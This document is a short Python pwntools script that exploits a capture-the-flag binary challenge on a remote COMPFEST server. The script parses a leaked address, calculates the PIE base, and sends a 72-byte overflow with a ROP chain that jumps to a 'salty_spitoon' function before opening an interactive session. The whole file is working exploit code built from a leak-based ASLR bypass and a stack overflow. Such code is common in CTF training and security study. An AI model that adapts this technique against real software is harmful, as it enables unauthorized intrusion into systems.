from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF("chall")

# p = gdb.debug(elf.path, gdbscript='continue')
#p = process()
p = remote("challenges.ctf.compfest.id", 20008)


p.sendlineafter('> ', '2')
p.recvuntil('Berikut isinya: ')

leak = int(p.recvline().strip().decode(), 16)
info("leaked_address: %#x", leak)

elf.address = leak - 0x1334

info("piebase: %#x", elf.address)

rop = ROP(elf)
RET = rop.find_gadget(['ret'])[0]

payload = flat(
    cyclic(72),
    RET,
    elf.sym['salty_spitoon']
)

p.sendlineafter('> ', '1')

p.sendlineafter('Selamat datang di Salty Spitoon, seberapa greget kamu?!\n', payload)
p.sendlineafter('> ', '3')
p.interactive()
